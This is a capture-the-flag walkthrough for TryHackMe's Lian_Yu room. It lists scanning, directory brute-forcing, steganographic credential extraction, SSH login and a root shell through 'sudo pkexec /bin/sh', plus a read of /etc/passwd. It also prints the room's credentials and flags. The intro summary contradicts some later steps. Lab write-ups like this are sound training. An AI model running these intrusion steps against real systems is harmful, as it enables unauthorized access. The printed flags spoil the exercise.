# TryHackMe-Lian_Yu
Lian_Yu is an Arrowverse-themed CTF room covering web enumeration, steganography, and privilege escalation. Nmap reveals ports 21, 22, 80. Find /island → codeword vigilante → /2100 → decode .ticket (Base58) for FTP password !#th3h00d. Fix corrupted PNG header → extract SSH key for slade. sudo pkexec /bin/sh gives root. Flags: user.txt &amp; root.txt.

# Lian_Yu TryHackMe Walkthrough

## Description

| | |
|---|---|
| **Room Name** | Lian_Yu |
| **Platform** | TryHackMe |
| **Difficulty** | Easy / Medium |
| **Category** | Capture The Flag (CTF) |
| **Techniques Used** | Network Scanning, Web Enumeration, Base58 Decoding, FTP Exploitation, Steganography, SSH Access, Privilege Escalation |
| **Tools Used** | nmap, gobuster, ftp, steghide, strings, binwalk, ssh, pkexec |

### Overview

The Lian_Yu room on TryHackMe is a Capture The Flag (CTF) challenge themed around the Green Arrow storyline, specifically referencing the island where Oliver Queen was stranded. This room tests fundamental penetration testing skills including reconnaissance, web enumeration, credential extraction, steganography, and privilege escalation.

Here's the complete Lian_Yu TryHackMe walkthrough with all steps in Markdown code format:

Here's the complete Lian_Yu TryHackMe walkthrough with all steps in Markdown code format:

```markdown
# Lian_Yu TryHackMe Walkthrough

---

## Step 1: Start Machine & VPN

1. Go to TryHackMe Lian_Yu room and click "Start Machine"
2. Wait 2-3 minutes for the machine to boot
3. Verify VPN connection by running: `ip a show tun0`
4. Confirm you see an IP address in the 10.x.x.x range
5. Note the target machine IP (e.g., 10.49.151.173)

**Screenshot:**

![Step 1](https://github.com/user-attachments/assets/324cda0d-6762-4f70-998a-95cd5aa51c2d)

---

## Step 2: Nmap Scan

Run comprehensive Nmap scan to discover open ports and services:

```bash
nmap -sC -sV -Pn 10.49.151.173
```

**Flag explanations:**
- `-sC`: Runs default security scripts for enumeration
- `-sV`: Detects service/version info on open ports
- `-Pn`: Skips host discovery (useful when ICMP is blocked)

**Expected findings:** HTTP (port 80) and FTP (port 21) services.

**Screenshot:**

![Step 2](https://github.com/user-attachments/assets/ad2ccf49-f500-4ab2-aaad-01d0a3d34814)

---

## Step 3: Directory Enumeration

Use Gobuster to find hidden web directories:

```bash
gobuster dir -u http://10.49.151.173 -w /usr/share/wordlists/dirb/common.txt
```

**What this does:** Brute-forces common directory names on the webserver.

**Key finding:** Discovers `/2100` directory.

Open in browser: `http://10.49.151.173/2100`

**Screenshots:**

![Step 3a](https://github.com/user-attachments/assets/59b563af-95f3-454c-ba75-eab56b946484)

![Step 3b](https://github.com/user-attachments/assets/626c368a-f67c-47f4-8c85-7e476475b25c)

---

## Step 4: Find Ticket

Inside `/2100` directory, locate `green_arrow.ticket` file.

**Action:**
1. Download or view the file
2. The content is Base58 encoded
3. Decode using online Base58 decoder or command line:

```bash
echo "encoded_string" | base58 -d
```

**Decoded credential:**
- FTP Username: `vigilante`
- FTP Password: `!#th3h00d`

**Screenshot:**

![Step 4](https://github.com/user-attachments/assets/b92be8db-ea7e-4811-9019-95aaf80ef266)

---

## Step 5: FTP Access

Connect to FTP server using discovered credentials:

```bash
ftp 10.49.151.173
```

**Login:**
- Username: `vigilante`
- Password: `!#th3h00d`

**Commands to run inside FTP:**
```bash
ls                    # List all files
binary                # Set binary transfer mode
get file1.jpg         # Download each image
get file2.png
get file3.jpg
bye                   # Exit FTP
```

**Download all image files** for steganography analysis.

**Screenshots:**

![Step 5a](https://github.com/user-attachments/assets/0901a36d-e5d2-4d94-8ba4-11bbce0e34c4)

![Step 5b](https://github.com/user-attachments/assets/04b30a22-8dd5-4d39-acf7-0103fcd6f0f0)

---

## Step 6: Extract Credentials

Extract hidden data from downloaded images using steganography tools:

**Method 1 - steghide:**
```bash
steghide extract -sf image.jpg
# Press Enter when prompted for passphrase (none by default)
```

**Method 2 - strings:**
```bash
strings image.jpg | grep -i password
```

**Method 3 - binwalk:**
```bash
binwalk -e image.jpg
```

**Extracted SSH credential:**
- Username: `slade`
- SSH Password: `M3tahuman`

**Screenshots:**

![Step 6a](https://github.com/user-attachments/assets/02a6519a-f230-452c-90d1-77998b081816)

![Step 6b](https://github.com/user-attachments/assets/1878c3f1-039a-4f16-9d07-3ae977252c38)

---

## Step 7: SSH Login

Connect via SSH to gain shell access:

```bash
ssh slade@10.49.151.173
```

When prompted:
- Password: `M3tahuman`

**After successful login:**
```bash
whoami                 # Confirm user is slade
pwd                    # Check current directory
ls -la                 # List all files
cat user.txt           # Read the user flag
```

**User Flag:**
`THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`

**Screenshots:**

![Step 7a](https://github.com/user-attachments/assets/6220da8c-083d-4c28-86ac-8031946e0450)

![Step 7b](https://github.com/user-attachments/assets/73a20538-e65f-44b9-9efb-f751896652b3)

---

## Step 8: Privilege Escalation

Escalate from `slade` to root using `pkexec` vulnerability:

**Step 1 - Check sudo permissions:**
```bash
sudo -l
```
This shows what commands the user can run as root.

**Step 2 - Verify pkexec is available:**
```bash
which pkexec
```

**Step 3 - Exploit pkexec:**
```bash
sudo pkexec /bin/sh
```

**What this does:** `pkexec` allows authorized users to execute commands as another user (typically root). When combined with sudo, it spawns a root shell.

**Success indicator:** Prompt changes from `$` to `#` (root shell).

**Verify root access:**
```bash
whoami                 # Should output "root"
id                     # Show user privileges
```

**Screenshot:**

![Step 8](https://github.com/user-attachments/assets/128dca68-5177-4c83-8ab5-93aadf764a3c)

---

## Step 9: Root Flag

Navigate to root directory and retrieve final flag:

```bash
cd /root               # Change to root's home directory
ls -la                 # List all files including hidden ones
cat root.txt           # Display the root flag
```

**Root Flag:**
`THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`

**Optional - Proof of completion:**
```bash
cat /etc/passwd
```

**Screenshot:**

![Step 9](https://github.com/user-attachments/assets/353b8718-3ed9-4be7-b692-8d1defc592cc)

---

## Summary

| Step | Action | Credentials/Flags Found |
|------|--------|------------------------|
| 1 | VPN & Machine Setup | Target IP: 10.49.151.173 |
| 2 | Nmap Scan | Port 80 (HTTP), Port 21 (FTP) |
| 3 | Directory Enumeration | /2100 directory |
| 4 | Find Ticket | vigilante / !#th3h00d |
| 5 | FTP Access | 3 image files downloaded |
| 6 | Extract Credentials | slade / M3tahuman |
| 7 | SSH Login | User flag captured |
| 8 | Privilege Escalation | Root shell obtained |
| 9 | Root Flag | Final root flag captured |

---

## Tools Used

- `nmap` - Network scanning
- `gobuster` - Directory enumeration
- `base58` - Decoding ticket
- `ftp` - File transfer
- `steghide` - Steganography extraction
- `strings` - String extraction
- `binwalk` - Embedded file detection
- `ssh` - Remote shell access
- `pkexec` - Privilege escalation

```

This Markdown code includes all 9 steps with their instructions, commands, screenshots, and a summary table at the end. You can copy this directly into a `.md` file and it will render properly on any Markdown viewer like GitHub, GitLab, or VS Code.
